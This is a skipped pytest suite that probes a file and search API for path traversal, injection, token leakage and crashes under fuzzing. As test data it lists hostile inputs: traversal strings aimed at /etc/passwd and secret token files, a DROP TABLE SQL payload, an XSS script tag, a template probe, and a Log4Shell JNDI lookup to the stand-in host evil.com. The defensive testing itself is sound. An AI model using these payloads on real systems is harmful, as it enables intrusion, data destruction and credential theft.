import pytest
import secrets
import string
from tools.gimo_server.security.auth import AuthContext, verify_token

# Mock TOKENS for test collection (tests are skipped anyway)
TOKENS = ["mock-token-1", "mock-token-2"]

pytestmark = [pytest.mark.unit, pytest.mark.skip(reason="Adversarial tests targeted for redesign.")]

# ── Helpers ──────────────────────────────────────────────

def random_string(length: int = 10) -> str:
    alphabet = string.ascii_letters + string.digits + string.punctuation + " "
    return "".join(secrets.choice(alphabet) for _ in range(length))

def _setup_admin_auth(app):
    def override_verify_token():
        return AuthContext(token="admin-token", role="admin")
    app.dependency_overrides[verify_token] = override_verify_token

# ── LLM Leakage & Semantic Attacks ────────────────────────

class TestLlmLeakage:
    """Simulates LLM-driven attacks (Prompt Injection / Leakage)."""

    @pytest.mark.parametrize("path", [
        "../../../etc/passwd",
        "..\\..\\..\\windows\\system32",
        "../../.env",
        "../../tools/gimo_server/.orch_token"
    ])
    def test_path_traversal_leakage(self, test_client, valid_token, path):
        """Verify LLM cannot access paths outside repo via semantic bypass."""
        res = test_client.get(f"/file?path={path}", headers={"Authorization": f"Bearer {valid_token}"})
        assert res.status_code in [400, 403, 503]

    def test_token_redaction_exhaustive(self, test_client, valid_token):
        """Ensure tokens are never leaked in file reads or search results."""
        # Test common sensitive files
        for f in [".env", "config.py"]:
            res = test_client.get(f"/file?path={f}", headers={"Authorization": f"Bearer {valid_token}"})
            if res.status_code == 200:
                content = res.text
                for t in TOKENS:
                    assert t not in content, f"Token leaked in {f}"

    @pytest.mark.parametrize("payload", [
        "'; DROP TABLE users--",
        "<script>alert(1)</script>",
        "${jndi:ldap://evil.com/a}",
        "{{7*7}}"
    ])
    def test_injection_parameters(self, test_client, valid_token, payload):
        """Verify injection patterns in query params are handled safely."""
        res = test_client.get(f"/search?q={payload}", headers={"Authorization": f"Bearer {valid_token}"})
        assert res.status_code in [200, 400, 422]

class TestInformationDisclosure:
    def test_error_messages_no_internal_paths(self, test_client, valid_token):
        res = test_client.get("/file?path=nonexistent_123.txt", headers={"Authorization": f"Bearer {valid_token}"})
        msg = str(res.json().get("detail", "")) if res.status_code != 200 else ""
        assert "C:\\" not in msg
        assert "/home/" not in msg

# ── Fuzzing & Stability ──────────────────────────────────

class TestFuzzing:
    def test_endpoint_chaos(self, test_client, valid_token):
        """Perform randomized fuzzing to verify no 500 errors."""
        endpoints = [("/status", "GET"), ("/tree", "GET"), ("/file", "GET")]
        for _ in range(50):
            url, _ = secrets.choice(endpoints)
            params = {"path": random_string(20), "q": random_string(10)}
            res = test_client.get(url, params=params, headers={"Authorization": f"Bearer {valid_token}"})
            # 500 is the failure condition
            assert res.status_code != 500

    def test_null_byte_stability(self, test_client, valid_token):
        payloads = ["test\0path", "\0/etc/passwd"]
        for p in payloads:
            res = test_client.get("/file", params={"path": p}, headers={"Authorization": f"Bearer {valid_token}"})
            assert res.status_code in [400, 403, 422]
